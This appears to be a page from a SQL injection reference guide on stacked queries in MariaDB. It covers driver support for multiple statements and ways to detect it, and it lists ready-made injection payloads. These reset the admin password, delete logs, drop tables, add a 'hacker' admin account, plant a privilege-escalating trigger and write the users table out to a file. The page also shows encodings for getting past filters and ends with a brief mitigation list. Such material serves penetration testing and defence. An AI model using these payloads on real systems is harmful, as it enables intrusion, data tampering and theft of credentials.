---
title: Stacked Queries
description: Executing multiple SQL statements in a single injection
category: Advanced Techniques
order: 18
tags: ["stacked queries", "multiple statements", "advanced injection"]
lastUpdated: 2025-12-18
---

## Stacked Queries

Stacked queries (also known as query stacking or multi-queries) allow attackers to execute multiple SQL statements in a single injection. This technique significantly extends the capabilities of SQL injection attacks beyond simple data extraction.

## Basic Syntax

In MariaDB, multiple SQL statements can be separated by semicolons (`;`):

```sql
SELECT * FROM users; DROP TABLE users;
```

This executes two separate queries: first selecting data, then dropping the table.

## Prerequisites for Stacked Queries

For stacked queries to work, two conditions must be met:

1. The database API must support multiple statements in a single query
2. The application must use a database connector that supports multi-queries

**Important:** Most modern database drivers disable multi-statements by default for security.

## Driver Support

### PHP Drivers

| Driver/Extension | Multi-Query Support | Notes                                                                 |
| ---------------- | ------------------- | --------------------------------------------------------------------- |
| PDO_MYSQL        | Yes (by default)    | Enabled with emulated prepares (default); can be disabled (see below) |
| MySQLi           | Yes                 | Only via `mysqli_multi_query()` function                              |
| mysql\_\*        | No                  | Deprecated functions, no multi-query support                          |

**PDO Multi-Statement Details:**

- **Default behavior**: Multi-statements work via `query()` when `PDO::ATTR_EMULATE_PREPARES` is `true` (default)
- **Disabling**: Set `PDO::MYSQL_ATTR_MULTI_STATEMENTS => false` in connection options (PHP 5.5.21+/5.6.5+)
- **Native prepares**: Setting `PDO::ATTR_EMULATE_PREPARES => false` also disables multi-statements
- **Result handling**: Only the first result set is returned to the application (all statements still execute)

```php
// MySQLi - supports stacked queries via multi_query()
$mysqli->multi_query("SELECT 1; SELECT 2;");

// PDO - supports stacked queries by default (emulated prepares)
$pdo->query("SELECT 1; SELECT 2;");
// All statements execute; app only sees first result set

// PDO - disable multi-statements for security
$pdo = new PDO($dsn, $user, $pass, [
    PDO::MYSQL_ATTR_MULTI_STATEMENTS => false
]);

// mysqli_query - REJECTS stacked queries (security feature)
mysqli_query($conn, "SELECT 1; SELECT 2;");
// Returns FALSE with error: "You have an error in your SQL syntax"
// This is intentional - mysqli_query() blocks multi-statement execution
// to prevent SQL injection attacks that append malicious statements
```

### Node.js Drivers

| Driver  | Multi-Query Support | Notes                                  |
| ------- | ------------------- | -------------------------------------- |
| mysql2  | No (by default)     | Must enable `multipleStatements: true` |
| mariadb | No (by default)     | Must enable `multipleStatements: true` |

### When Blocked by Driver

When multi-statements are disabled, stacked queries fail:

```sql
-- These will fail or only execute first statement
SELECT 1; SELECT 2;
SELECT * FROM users; DROP TABLE users;
INSERT INTO logs VALUES(1); SELECT * FROM users;
```

## Detection

### Time-based Detection

```sql
-- If app pauses for 5 seconds, stacked queries work
1'; SELECT SLEEP(5); -- -
```

### Data Modification Test

```sql
-- Try to modify data and check if it changed
1'; UPDATE users SET email='test@test.com' WHERE id=1; -- -
```

### Error-based Detection

```sql
-- Syntax error in second statement reveals behavior
1'; INVALID SYNTAX HERE; -- -
```

If you get an error mentioning the second statement, multi-statements may be partially supported.

**Interpreting Errors:**

- **Error mentions second statement**: Driver parses both statements but may reject multi-query execution
- **No error, but only first result returned**: Driver silently ignores subsequent statements
- **Error immediately**: Multi-statements completely blocked at driver level

```sql
-- Test with valid second statement to differentiate blocking methods
1'; SELECT 2; -- -
```

## Stacked Query Examples

### Data Modification

```sql
1'; UPDATE users SET password='hacked' WHERE username='admin'; -- -

1'; DELETE FROM logs WHERE 1=1; -- -
```

### Creating a New Admin User

```sql
1'; INSERT INTO users (username, password, role) VALUES ('hacker', MD5('owned'), 'admin'); -- -
```

### Schema Manipulation

```sql
1'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255); -- -

1'; CREATE TABLE exfil (data TEXT); -- -

1'; DROP TABLE IF EXISTS logs; -- -
```

### Setting Variables

```sql
1'; SET @var = (SELECT password FROM users WHERE username='admin'); SELECT @var; -- -
```

### Executing Stored Procedures

```sql
1'; CALL some_stored_procedure(); -- -
```

**Note:** CREATE PROCEDURE with BEGIN/END blocks requires DELIMITER changes, which cannot be sent through most database drivers (DELIMITER is a mysql CLI command, not SQL).

## Advanced Exploitation

### Writing to Files

Some file operations benefit from stacked queries when combined with other commands:

> **Note:** See [Writing Files](/mariadb/writing-files) for detailed INTO OUTFILE and web shell techniques.

### Creating Triggers

Single-statement triggers can be created without DELIMITER changes:

```sql
1'; CREATE TRIGGER after_user_insert AFTER INSERT ON users FOR EACH ROW UPDATE users SET role='admin' WHERE id=NEW.id; -- -
```

**Note:** Multi-statement triggers using BEGIN...END blocks require DELIMITER changes, which are only available in the mysql CLI (not through most database drivers).

### Practical Attack Pattern

```sql
1';
-- Check privileges
SELECT user,file_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(USER(),'@',1);
-- Extract data
SELECT * FROM users INTO OUTFILE '/tmp/users.txt';
-- Create backdoor
INSERT INTO users (username, password, is_admin) VALUES ('backdoor', MD5('secret'), 1);
-- -
```

## Single-Statement Alternatives

When stacked queries are blocked, use these techniques instead:

### UNION-based Extraction

```sql
-- Extract data without stacked queries
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, password FROM users WHERE username = 'admin'
```

### Subquery Extraction

```sql
-- Extract via subquery
SELECT (SELECT password FROM users WHERE username = 'admin') AS extracted
```

### User Variable Assignment

```sql
-- Set variable in single statement (no semicolon)
SELECT @pw := password FROM users WHERE username = 'admin'

-- Variable with subquery
SELECT @cnt := (SELECT COUNT(*) FROM users) AS user_count

-- Chained assignments
SELECT @a := 1, @b := @a + 1, @c := @b + 1
```

### INTO OUTFILE (Single Statement)

```sql
-- File operations without stacking
SELECT 'data' INTO OUTFILE '/tmp/test.txt'
```

## Dynamic SQL Execution

### PREPARE/EXECUTE/DEALLOCATE (Requires Stacked Queries)

The traditional prepared statement pattern requires multiple statements:

```sql
PREPARE stmt FROM 'SELECT 1';
EXECUTE stmt;
DEALLOCATE PREPARE stmt;
```

This pattern is **blocked** when multi-statements are disabled, as it requires three separate SQL statements.

### MariaDB-Specific: EXECUTE IMMEDIATE

MariaDB 10.2.3+ supports `EXECUTE IMMEDIATE`, which executes dynamic SQL in a single statement:

```sql
EXECUTE IMMEDIATE 'SELECT 1 AS result'

-- With variable
EXECUTE IMMEDIATE CONCAT('SELECT * FROM ', 'users')
```

This works even when stacked queries are blocked because it's a single statement.

## Bypassing Filters

### URL Encoding

```sql
-- URL-encoded semicolon
1'%3B%20INSERT%20INTO%20users...
```

### Using CHAR()

```sql
-- Build strings without quotes
SELECT CHAR(97, 100, 109, 105, 110)
-- Returns: 'admin'
```

### Hex Encoding

```sql
SELECT 0x61646D696E
-- Returns: 'admin'
```

### Comment Techniques

```sql
-- Inline comment
SELECT /*!50000 1 AS version_check*/

-- Version-conditional
SELECT 1 /*!50000,2*/

-- Block comment
SELECT /* comment */ username FROM users LIMIT 1
```

## Limitations

1. Many applications use database APIs that don't support multiple statements
2. Web Application Firewalls often block semicolons in input
3. Some database operations require elevated privileges
4. CREATE PROCEDURE/FUNCTION requires DELIMITER (CLI only)
5. Only first result set is returned to application

## Mitigation

To prevent stacked query attacks:

1. Use database libraries that don't support multi-statements by default
2. Explicitly disable multi-statements in connection options
3. Implement proper parameterized queries
4. Apply the principle of least privilege to database users
5. Filter and validate all user input
6. Use a WAF to detect and block SQL injection attempts
